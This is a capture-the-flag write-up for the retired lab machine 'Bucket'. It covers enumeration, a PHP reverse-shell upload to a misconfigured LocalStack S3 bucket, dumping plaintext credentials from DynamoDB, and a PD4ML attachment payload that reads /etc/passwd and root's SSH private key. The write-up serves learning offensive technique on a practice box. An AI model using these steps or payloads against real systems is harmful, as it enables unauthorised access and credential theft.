# Bucket

This is the write-up for the box Bucket that got retired at the 24th April 2021.
My IP address was 10.10.14.9 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.212    bucket.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/bucket.nmap 10.10.10.212
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://bucket.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The website has the title _"Bucket Advertising Platform"_ and advertises bug bounty and 0-day research.
In the HTML source code, it shows the link where the images are hosted on _s3.bucket.htb_:
```
http://s3.bucket.htb/adserver/images/bug.jpg"
```

To access this service, the hostname _s3.bucket.htb_ has to be put into our _/etc/hosts_ file.
The response shows some headers, that are usually used by **AWS S3 Buckets**:
```
HTTP/1.1 404
(...)
Server: hypercorn-h11
(...)
access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
access-control-expose-headers: x-amz-version-id
(...)

{"status": "running"}
```

Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://s3.bucket.htb dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
```

It finds the directory _/health_ which shows the state of the services in JSON data:
```
{"services": {"s3": "running", "dynamodb": "running"}}
```

To interact with this service, we need the [AWS Command Line](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/index.html):
```
apt install awscli
```

Enumerating the S3 bucket:
```
aws --endpoint-url http://s3.bucket.htb s3 ls

Unable to locate credentials. You can configure credentials by running "aws configure".
```

Configuring AWS:
```
aws configure

AWS Access Key ID [None]: DoesNotMatter
AWS Secret Access Key [None]: DoesNotMatter
Default region name [None]: us-east-1
Default output format [None]:
```

Now it works and it is possible to access the directories of the S3 bucket:
```
aws --endpoint-url http://s3.bucket.htb s3 ls

2022-01-02 12:06:03 adserver
```

> NOTE: The reason why this works, is because this box uses [LocalStack](https://github.com/localstack/localstack) which is a local AWS cloud stack and simulates that service. It is not fully configured, so it allows any _Access Key ID_ and _Secret Key_.

Trying to upload the _php-reverse-shell.php_ from the **Laudanum scripts** to the S3 bucket:
```
aws --endpoint-url http://s3.bucket.htb s3 cp revshell.php s3://adserver/

upload: ./revshell.php to s3://adserver/revshell.php
```

The file gets successfully uploaded on _bucket.htb/revshell.php_ and after browsing there, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

Checking local listening ports:
```
ss -lnpt

127.0.0.1:4566
127.0.0.1:44637
127.0.0.1:8000
```

Checking the **Apache2** enabled sites:
```
cat /etc/apache2/sites-enabled/000-default.conf | grep -v '\#' | grep .
```

The configuration shows that port 4566 forwards to port 80 and is the **Docker** container, where _s3.bucket.htb_ runs.
As checked before, it runs **S3** and **DynamoDB** as the database, that can also be enumerated with the AWS CLI:
```
aws --endpoint-url http://s3.bucket.htb dynamodb list-tables

{
    "TableNames": [
        "users"
    ]
}
```

Enumerating the tables _users_:
```
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
```

It contains three different credentials and as the output is in JSON, it can be simplified to display the needed data:
```
aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[] | "\(.username[]):\(.password[])"'

Mgmt:Management@#1@#
Cloudadm:Welcome123!
Sysadm:n2vM-<_K_Q:.Aa2
```

Port 8000 is listening only on localhost with the assigned user as root and the directory is in _/var/www/bucket-app_ where permissions for this user is denied:
```
ls -l /var/www/           

drwxr-x---+ 4 root root 4096 Feb 10  2021 bucket-app
```

The plus sign next to the permissions tells that this directory has extended permissions that can be checked with `getfacl`:
```
getfacl /var/www/bucket-app/

user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

The user _roy_ has access to it, so lets test all found credentials for this user:
```
ssh roy@10.10.10.212
```

The password of the user _Sysadm_ from the database works for the user _roy_.

### Privilege Escalation 2

In the directory _/var/www/bucket-app_ the file _pd4ml_demo.jar_ is the Java library [PD4ML](https://pd4ml.com/) that can convert HTML to PDF files and is used in _index.php_:
```
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                // (...)

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
```

Summary of the code:
1. If POST request contains data _"action=get_alerts"_
2. Use the _alerts_ table, pull the title and if _"title=Ransomware"_
3. Put data into HTML file
4. Use _pd4ml_ on the HTML file to convert it to PDF

Forwarding port 8000 from the box to our local client with the [SSH Command Line](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/):
```
ssh> -L 8000:127.0.0.1:8000
```

Creating table _alerts_:
```
aws --endpoint-url http://s3.bucket.htb dynamodb create-table \
--table-name alerts \
--attribute-definitions AttributeName=title,AttributeType=S \
--key-schema AttributeName=title,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```

Creating a file that has _"Ransomware"_ in the title:
```json
{"title":
        {"S": "Ransomware"},
        "data":
        {
                "S":"<html><pd4ml:attachment src='file:///etc/passwd' description:'attachment sample' icon='Paperclip'/>"
        }
}
```

Uploading the JSON file into the table:
```
aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://ransomware.json
```

Requesting the parameter _action=get_alerts_ with `curl`:
```
curl -X POST -d "action=get_alerts" http://127.0.0.1:8000 -v
```

The created PDF file _result.pdf_ can be found in the _/files_ directory and it contains an attachment to _/etc/passwd_ of the box, so it is possible to read any file on the box.

Changing the payload to read _/root/.ssh/id_rsa_ and doing the procedure again:
```
(...)
  "S":"<html><pd4ml:attachment src='file:///root/.ssh/id_rsa' description:'attachment sample' icon='Paperclip'/>"
```

After putting the JSON file into the table and sending the POST request, the PDF file has the contents of the private SSH key of root that can be used to SSH into the box:
```
ssh -i bucket_root.key 10.10.10.212
```
